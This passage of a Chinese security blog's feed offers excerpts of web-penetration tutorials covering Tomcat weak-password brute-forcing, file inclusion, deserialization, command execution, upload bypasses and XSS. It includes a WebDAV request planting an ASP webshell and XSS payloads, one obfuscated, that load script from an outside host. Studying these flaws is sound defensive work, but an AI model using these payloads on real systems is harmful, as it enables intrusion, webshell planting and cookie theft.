先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包   0x02漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码  #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &amp;quot;&amp;quot;&amp;quot; 简单爆破后台登陆密码 Usage: python tomcat.py username.txt password.txt urlfile.txt username.txt为用户名字典 password.txt为密码字典 urlfile.txt为后台url列表 &amp;quot;&amp;quot;&amp;quot; def get_username(userfile): username = [] with open(userfile, &#39;r&#39;) as f: lines = f.</description>
    </item>
    
    <item>
      <title>CGI与FastCGI与PHP-FPM</title>
      <link>http://wyb0.com/posts/cgi-and-fastcgi-and-php-fpm/</link>
      <pubDate>Tue, 02 Aug 2016 10:45:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/cgi-and-fastcgi-and-php-fpm/</guid>
      <description> 0x01 CGI协议  中间件在收到请求时会去找php解析器处理，cgi是规定了要传递哪些数据(比如url、header、post数据等)的协议
 0x02 FastCGI  服务端收到请求时会启动对应的cgi程序(如php-cgi)，即php的解析器，php解析器会解析php.ini文件、初始化执行环境，然后执行请求，每次都是这样，性能比较低
fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执行环节，然后启动多个worker直接依次处理多个web server的连接，不用每次都解析php.ini等
 0x03 FastCGI工作流程  一般情况下，FastCGI的整个工作流程是这样的：
  Web Server启动时载入FastCGI进程管理器（IIS ISAPI或Apache Module) FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可见多个php-cgi)并等待WebServer的连接。 当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。 Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。  0x04 PHP-FPM  php-fpm就是fastcgi的实现，是一个php fastcgi进程管理器 php-fpm在php5.2之后默认添加 千万不要把fastcgi端口对公网暴露  </description>
    </item>
    
    <item>
      <title>BurpSuite的Intruder模块</title>
      <link>http://wyb0.com/posts/burpsuite-intruder-module/</link>
      <pubDate>Mon, 01 Aug 2016 09:17:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/burpsuite-intruder-module/</guid>
      <description> 0x00 示例一   0x01 示例二   </description>
    </item>
    
    <item>
      <title>逻辑漏洞</title>
      <link>http://wyb0.com/posts/logical-loophole/</link>
      <pubDate>Sun, 31 Jul 2016 18:43:49 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/logical-loophole/</guid>
      <description>0x00 逻辑漏洞  逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。   0x01 密码找回漏洞  测试流程
 先尝试正确的密码找回流程，记录不同找回方式的所有数据包 分析数据包，找到有效数据部分 推测数据构造方法 构造数据包验证猜测  分类
 邮箱找回   一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接： http://domain/findpwd.php?u=xiaoming&amp;amp;token=MTIzQHFxLmNvbQ== http://domain/findpwd.php?id=374&amp;amp;token=2ad64bf14c714dbce88c7993663da7da 当构造相应链接时就可以重置任意用户的密码    手机短信找回   短信找回一般就是4位或6位验证码，暴力猜测吧    找回逻辑错误   若恶意用户A用15123333333找回密码，此时收到验证码但不使用 此时恶意用户A再用受害者B的手机号找回密码 用户A在B的验证表单填入自己收到的验证码，发送 此时跳转的修改密码页面修改的就是用户B的密码    直接修改密码    在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改    本地验证   随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段， 若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可    服务端将验证码返回给浏览器    在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可    验证码直接出现在url中   当点击获取验证码时发出的请求链接中直接有code    密保问题找回   回答密保问题，有时一些答案就在html源码里    0x02 多线程条件竞争漏洞  多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的,</description>
    </item>
    
    <item>
      <title>敏感信息泄露</title>
      <link>http://wyb0.com/posts/sensitive-information-leakage/</link>
      <pubDate>Thu, 28 Jul 2016 22:42:58 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/sensitive-information-leakage/</guid>
      <description>0x00 软件敏感信息  * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatweb) * Web程序(cms类型及版本、敏感文件) 可用whatweb、cms_identify   0x01 Web敏感信息  * phpinfo()信息泄露 http://[ip]/test.php和http://[ip]/phpinfo.php * 测试页面泄露在外网 test.cgi、phpinfo.php、info.php等 * 编辑器备份文件泄露在外网 http://[ip]/.test.php.swp http://[ip]/test.php.bak http://[ip]/test.jsp.old http://[ip]/cgi~ 常见编辑器备份后缀 * 版本管理工具(如git)文件信息泄露 http://[ip]/.git/config http://[ip]/CVS/Entriesp http://[ip]/.svn/entriesp * HTTP认证泄露漏洞 http://[ip]/basic/index.php Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码 * 管理后台地址泄露 http://[ip]/login.php http://[ip]/admin.php http://[ip]/manager.php http://[ip]/admin_login.php * 泄露员工邮箱、分机号码 泄露邮箱及分机号码可被社工，也可生成字典 * 错误页面暴漏信息 mysql错误、php错误、暴漏cms版本等 * 探针文件 * robots.txt * phpMyAdmin * 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等) * 其他   0x02 网络信息泄露  * DNS域传送漏洞 * 运维监控系统弱口令、网络拓扑泄露 zabbix弱口令、zabbix sql注入等   0x03 第三方软件应用  * github上源码、数据库、邮箱密码泄露 搜类似：smtp 163 password关键字 * 百度网盘被员工不小心上传敏感文件 * QQ群被员工不小心上传敏感文件   0x04 敏感信息搜集工具  https://github.</description>
    </item>
    
    <item>
      <title>任意文件查看与下载漏洞</title>
      <link>http://wyb0.com/posts/any-file-view-and-download-vulnerability/</link>
      <pubDate>Wed, 27 Jul 2016 23:25:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/any-file-view-and-download-vulnerability/</guid>
      <description>0x00 漏洞介绍  一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件 不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞   0x01 利用条件  * 存在读文件的函数 * 读取文件的路径用户可控且未校验或校验不严 * 输出了文件内容   0x02 漏洞危害  下载服务器任意文件，如脚本代码、服务及系统配置文件等 可用得到的代码进一步代码审计，得到更多可利用漏洞   0x03 任意文件读取  代码形式可如下几种：
&amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; readfile($filename); ?&amp;gt; &amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; $fp = fopen($filename,&amp;quot;r&amp;quot;) or die(&amp;quot;Unable to open file!&amp;quot;); $data = fread($fp,filesize($filename)); fclose($fp); echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; print_r(htmlspecialchars($data)); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt; &amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; $data = file_get_contents($filename); echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; print_r(htmlspecialchars($data)); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?</description>
    </item>
    
    <item>
      <title>文件包含漏洞</title>
      <link>http://wyb0.com/posts/file-include-vulnerabilities/</link>
      <pubDate>Tue, 26 Jul 2016 09:24:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-include-vulnerabilities/</guid>
      <description>0x00 文件包含   程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件， 而无需再次编写，这中文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用， 但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多, 而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。 在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。   0x01 常见文件包含函数  include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含   0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量   注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径   0x03 漏洞危害  执行任意代码 包含恶意文件控制网站 甚至控制服务器   0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码 上传图片马，然后包含 读敏感文件，读PHP文件 包含日志文件GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件 远程文件包含：可以直接执行任意代码 要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS吧，骚年...   0x06 本地包含  示例一   &amp;lt;?php if (@$_GET[&#39;page&#39;]) { include($_GET[&#39;page&#39;]); } else { include &amp;quot;show.</description>
    </item>
    
    <item>
      <title>PHP反序列化漏洞</title>
      <link>http://wyb0.com/posts/php-deserialization-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-deserialization-vulnerabilities/</guid>
      <description>0x00 关于反序列化漏洞  序列化：使用函数serialize()可将实例序列化为字符串
反序列化：使用函数unserialize()可将序列化的字符串还原
若服务端有如下代码：
&amp;lt;?php class foo{ public $file = &amp;quot;test.txt&amp;quot;; public $data = &amp;quot;123456&amp;quot;; function __destruct(){ file_put_contents($this-&amp;gt;file,$this-&amp;gt;data); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize(base64_decode($d)); var_dump($tc); ?&amp;gt;  客户端可构造如下代码生成序列化后的字符串提交给服务端，
服务端就会生成文件xx.php，内容为&amp;lt;?php phpinfo(); ?&amp;gt;：
&amp;lt;?php class foo { public $ﬁle = &amp;quot;test.txt&amp;quot;; public $data = &amp;quot;123456&amp;quot;; function __destruct() { ﬁle_put_contents($this-&amp;gt;ﬁle, $this-&amp;gt;data); } } $f = new foo(); $f-&amp;gt;ﬁle = &amp;quot;xx.php&amp;quot;; $f-&amp;gt;data = &amp;quot;&amp;lt;?php phpinfo(); ?</description>
    </item>
    
    <item>
      <title>代码执行漏洞</title>
      <link>http://wyb0.com/posts/code-execution-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 22:32:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/code-execution-vulnerabilities/</guid>
      <description>0x00 代码执行  当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时， 没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。   0x01 相关函数  PHP：eval assert Python：exec asp：&amp;lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&amp;gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能   0x02 phpcms中的string2array函数  这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
array( //这个是字符串形式的数组，它并不是数组，而是字符串 &#39;upload_maxsize&#39; =&amp;gt; &#39;2048&#39;, &#39;upload_allowext&#39; =&amp;gt; &#39;jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf&#39;, &#39;watermark_enable&#39; =&amp;gt; &#39;1&#39;, &#39;watermark_minwidth&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_minheight&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_img&#39; =&amp;gt; &#39;/statics/img/water/mark.png&#39;, &#39;watermark_pct&#39; =&amp;gt; &#39;85&#39;, &#39;watermark_quality&#39; =&amp;gt; &#39;80&#39;, &#39;watermark_pos&#39; =&amp;gt; &#39;9&#39;, )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == &#39;&#39;) return array(); @eval(&amp;quot;\$array = $data;&amp;quot;); return $array; }   0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器   0x04 漏洞分类(也是利用点)  执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)   0x05 漏洞挖掘  框架找漏洞，如ThinkPHP： inurl:index.</description>
    </item>
    
    <item>
      <title>Windows下用Proxifier实现全局代理</title>
      <link>http://wyb0.com/posts/windows-proxifier-implement-global-proxy/</link>
      <pubDate>Sun, 24 Jul 2016 21:33:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-proxifier-implement-global-proxy/</guid>
      <description> 0x00 环境  在windows下用Shadowsocks和Proxifier实现全局代理：
System：Windows10 Pro x64 Shadowsocks：Shadowsocks v2.5.2.0 Proxifier：Proxifier Portable Edition v3.29   0x01 配置Shadowsocks   0x02 配置Proxifier  Proxifier添加代理服务  Proxifier添加规则  测试全局代理设置成功与否   </description>
    </item>
    
    <item>
      <title>命令执行漏洞</title>
      <link>http://wyb0.com/posts/command-execution-vulnerabilities/</link>
      <pubDate>Sun, 24 Jul 2016 14:32:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/command-execution-vulnerabilities/</guid>
      <description>0x00 命令执行  应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。   0x01 利用条件  应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严  0x02 漏洞分类  代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
system(&amp;ldquo;/bin/program --arg $arg&amp;rdquo;); 系统的漏洞造成命令执行
bash破壳漏洞(CVE-2014-6271)
执行env x=&#39;() { :;}; echo vulnerable&#39; bash -c &amp;quot;echo this is a test&amp;quot;后
若输出vulnerable则证明存在漏洞 调用的第三方组件存在代码执行漏洞
如WordPress中用来处理图片的ImageMagick组件
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)
ThinkPHP命令执行  0x03 漏洞危害  继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至控制服务器 进一步内网渗透 等等  0x04 漏洞挖掘  可以google hacking
尝试：filetype:action或filetype:do来找struts2
 0x05 漏洞可能代码(以system为例)  1. system(&amp;quot;$arg&amp;quot;); //直接输入即可 2. system(&amp;quot;/bin/prog $arg&amp;quot;); //直接输入;ls 3.</description>
    </item>
    
    <item>
      <title>文件上传之文本编辑器上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</link>
      <pubDate>Thu, 21 Jul 2016 15:11:29 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</guid>
      <description> 0x00 文本编辑器  常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。
 0x01 FCKeditor  下面以FCKeditor(现名为CKEditor)为例：
1、敏感信息暴漏 * 查看版本信息 /FCKeditor/editor/dialog/fck_about.html * 默认上传页面 /FCKeditor/editor/filemanager/browser/default/browser.html /FCKeditor/editor/filemanager/browser/default/connectors/test.html /FCKeditor/editor/filemanager/upload/test.html /FCKeditor/editor/filemanager/connectors/test.html /FCKeditor/editor/filemanager/connectors/uploadtest.html * 其他敏感文件 /FCKeditor/editor/filemanager/connectors/aspx/connector.html /FCKeditor/editor/filemanager/connectors/asp/connector.html /FCKeditor/editor/filemanager/connectors/php/connector.php 2、黑名单策略错误 FCKeditor&amp;lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名 3、任意文件上传漏洞 FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行， 在form中的action=&amp;quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&amp;quot; 即可，然后上传   0x02 eWebEditor  1、默认后台 2.80以前为：ewebeditor/admin_login.asp 2.80以后为：admin/login.asp 2、默认账号密码 admin admin888 3、数据库地址 默认数据库地址 ewebeditor/db/ewebeditor.mdb 常用数据库地址 ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asa ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb asp asa为后缀的数据库下载下来后改为mdb   0x03 参考链接  http://navisec.it/编辑器漏洞手册/
 </description>
    </item>
    
    <item>
      <title>文件上传之绕过上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-simple-to-bypass/</link>
      <pubDate>Wed, 20 Jul 2016 17:04:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-simple-to-bypass/</guid>
      <description>0x00 一般防止上传漏洞手法  1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证 //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少 //服务器开销，而服务端验证才可以真正防御攻击者。 2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法   0x01 客户端检测  客户端验证代码形如下： &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;图片上传&amp;lt;/title&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; function checkFile(){ var flag = false; var str = document.getElementById(&amp;quot;file&amp;quot;).value; str = str.substring(str.lastIndexOf(&#39;.&#39;) + 1); var arr = new Array(&#39;png&#39;,&#39;bmp&#39;,&#39;gif&#39;,&#39;jpg&#39;); for (var i=0;i&amp;lt;arr.length;i++){ if(str==arr[i]){ flag = true; } } if(!flag){ alert(&#39;文件不合法！&#39;); } return flag; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;upload.php&amp;quot; method=&amp;quot;post&amp;quot; onsubmit=&amp;quot;checkFile()&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; name=&amp;quot;submit&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  接收文件的脚本upload.</description>
    </item>
    
    <item>
      <title>文件上传之解析漏洞</title>
      <link>http://wyb0.com/posts/file-upload-parse-vulnerability/</link>
      <pubDate>Wed, 20 Jul 2016 16:08:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-parse-vulnerability/</guid>
      <description>0x00 解析漏洞  文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat等   0x01 IIS解析漏洞  IIS6.0在解析文件时存在以下两个解析漏洞
1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。 2、当文件名为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。  WebDav漏洞
 WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若 支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。 测试步骤如下： 1）通过OPTIONS探测服务器所支持的HTTP方法 请求： OPTIONS / HTTP/1.1 Host: www.xxxx.com 2)通过PUT方法向服务器上传shell 请求： PUT /a.txt HTTP/1.1 Host: www.xxxx.com Content-Length: 30 &amp;lt;%eval request(&amp;quot;chopper&amp;quot;) %&amp;gt; 3)通过Move或Copy方法改名 请求： COPY /a.txt HTTP/1.1 Host: www.xxxx.com Destination: http://www.xxxx.com/cmd.asp 4)用DELETE方法删除文件 请求： DELETE /a.txt HTTP/1.1 Host: www.xxxx.com 注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞   0x02 Apache解析漏洞  在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件&amp;quot;/conf/mime.types&amp;quot;中配置Apache可以识别的文件名   0x03 Nginx解析漏洞  对低版本的Nginx可以在任意文件名后添加%00.</description>
    </item>
    
    <item>
      <title>文件上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-vulnerabilities/</link>
      <pubDate>Wed, 20 Jul 2016 11:30:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-vulnerabilities/</guid>
      <description> 0x00 文件上传漏洞  当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的 脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。   0x01 权限  1. 后台权限：登陆了后台，可以进行一些操作、配置 2. 网站权限：获得了webshell，可以进行查看源代码等操作 3. 服务器权限：可以对服务器进行任意操作   0x02 漏洞分类  1. 配置不当可直接上传shell HTTP的PUT方法开启了 2. 文件解析漏洞导致文件执行 Web容器解析漏洞 3. 本地文件上传限制被绕过 BurpSuite抓包修改即可绕过 4. 服务端过滤不严或被绕过 使用了黑名单过滤 5. 文件路径截断上传 00截断等 6. 开源编辑器上传漏洞 如CKEditor(FCKeditor的新版)、eWebEditor的漏洞   0x03 利用条件  1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径 2. 其次,用户能从web访问这个文件 3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败   0x04 漏洞挖掘  1. 查找上传点，如图片、附件、头像的上传等 2. 找类似upload的目录、类似upload.php的文件 3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等   0x05 常见可执行文件后缀  可用于绕过： php php2 php3 php5 phtml asp aspx ascx ashx cer asa jsp jspx   </description>
    </item>
    
    <item>
      <title>虚拟机下安装vm-tools</title>
      <link>http://wyb0.com/posts/vmware-install-vm-tools/</link>
      <pubDate>Wed, 20 Jul 2016 08:30:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/vmware-install-vm-tools/</guid>
      <description> vm-tools安装后可以在客户机和虚拟机间双向复制文件
安装   Kali2.0  一般安装的话按照上面的步骤即可安装成功，但是Kali2.0不行，可以用如下方法安装： 安装后可以终端输入：dpkg-reconfigure locales，在弹出的界面选择zh_CN.UTF-8设置语言为中文 可以用vim /root/.config/user-dirs.dirs将&amp;quot;桌面&amp;quot;修改为&amp;quot;Desktop&amp;quot;   </description>
    </item>
    
    <item>
      <title>XSS实例</title>
      <link>http://wyb0.com/posts/xss-example/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-example/</guid>
      <description>首先感谢凯神的指导。。。
0x00 注册账号  先得到一个临时邮箱，然后注册账号  0x01 找输入输出点   0x02 尝试构造payload  payload用如下的即可：
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js   0x03 加载自己的js  此时的限制条件为：   * 30个字符 * script标签不能自己触发    只能构造类似下面的语句自己加载脚本：   a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);    可以用如下方法分割，多次添加：   a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行    查找  构造payload    使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.</description>
    </item>
    
    <item>
      <title>XSS漏洞挖掘与利用</title>
      <link>http://wyb0.com/posts/xss-use-and-defense/</link>
      <pubDate>Fri, 15 Jul 2016 16:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-use-and-defense/</guid>
      <description>0x00 XSS的检测  检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测
手工检测：检测结果准确，但对于大型web来说费时费力
软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出
检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出
1. 手工检测 可得知输出位置: • 输入敏感字符，如“&amp;lt;、&amp;gt;、&amp;quot;、&#39;、()”等，然后在提交后查看html源代码，看这些字符是否被转义。 • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&amp;lt;&amp;gt;&amp;quot;&amp;amp;&#39;()”字符串，然后查找AAAAAA或许比较方便。 无法得知输出位置: 很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如： 在标签中：&amp;lt;div&amp;gt;XSS Test&amp;lt;/div&amp;gt; 在属性内：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;content&amp;quot; value=&amp;quot;XSS Test&amp;quot; /&amp;gt; 这种情况通常采用输入&amp;quot;/&amp;gt;XSS Test来测试。  2. 全自动检测XSS 如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。
专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。
一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。
 0x01 XSS的挖掘与利用  XSS漏洞挖掘
反射型XSS： 一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严 存储型XSS： 可以提交内容 提交的内容可被管理员或其他用户看到 提交的内容没有被过滤或过滤不严  XSS漏洞利用 XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
• &amp;lt;script src=&#39;http://b.ioio.pub/xss/probe.js&#39;&amp;gt;&amp;lt;/script&amp;gt; • &amp;lt;img src=x onerror=&amp;quot;s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&#39;&amp;quot;;&amp;gt; • &amp;lt;svg onload=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&amp;gt; • &amp;lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99, 114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59, 115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47, 112,114,111,98,101,46,106,115)) &amp;gt;   0x03 XSS简单示例  反射型xss简单示例: • &amp;lt;?</description>
    </item>
    
    <item>
      <title>XSS初识</title>
      <link>http://wyb0.com/posts/xss-basis/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-basis/</guid>
      <description>0x00 简介  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
 0x01 危害  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
• 盗取管理员Cookie • XSS Worm • 挂马(水坑攻击) • 键盘记录(有局限性) • 利用网站重定向 • 修改网页内容 • 等等   0x02 攻击场景  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。
• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等 • url的参数，回显到网页上 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言 • 等等   0x03 分类  主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。
